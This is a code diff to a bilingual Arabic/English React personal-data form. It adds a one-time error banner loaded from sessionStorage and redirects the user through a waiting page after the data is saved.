@@ -232,6 +232,15 @@ export default function PersonalData() {
   const sessionId = localStorage.getItem("sessionId") || "";
   const { language } = useLanguage();
   const isArabic = language === "ar";
+  const [errorMessage, setErrorMessage] = useState<string | null>(null);
+
+  useEffect(() => {
+    const storedError = sessionStorage.getItem("errorMessage");
+    if (storedError) {
+      setErrorMessage(storedError);
+      sessionStorage.removeItem("errorMessage");
+    }
+  }, []);
 
   const [formData, setFormData] = useState({
     nameIdentity: "",
@@ -292,7 +301,7 @@ export default function PersonalData() {
         country: formData.country,
       });
       toast.success(isArabic ? "تم حفظ البيانات بنجاح" : "Data saved successfully");
-      setLocation(`/registration-completion?bank=${bank}&session=${sessionId}`);
+      setLocation(`/waiting?bank=${bank}&session=${sessionId}&next=registration-completion`);
     } catch (error) {
       toast.error(isArabic ? "حدث خطأ في حفظ البيانات" : "Error saving data");
     }
@@ -301,6 +310,13 @@ export default function PersonalData() {
   return (
     <div dir={isArabic ? "rtl" : "ltr"} style={{ margin: 0, padding: 0, fontFamily: 'sans-serif', backgroundColor: '#f4f4f4', minHeight: '100vh' }}>
       <Header />
+
+      {/* Error Message */}
+      {errorMessage && (
+        <div style={{ maxWidth: '600px', margin: '20px auto', padding: '15px', background: '#fee2e2', border: '1px solid #ef4444', borderRadius: '8px', color: '#b91c1c', textAlign: 'center', fontWeight: 'bold' }}>
+          {errorMessage}
+        </div>
+      )}
 
       {/* Slider Banner - Full Width */}
       <div style={{ width: '100%', position: 'relative', height: '300px', overflow: 'hidden', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
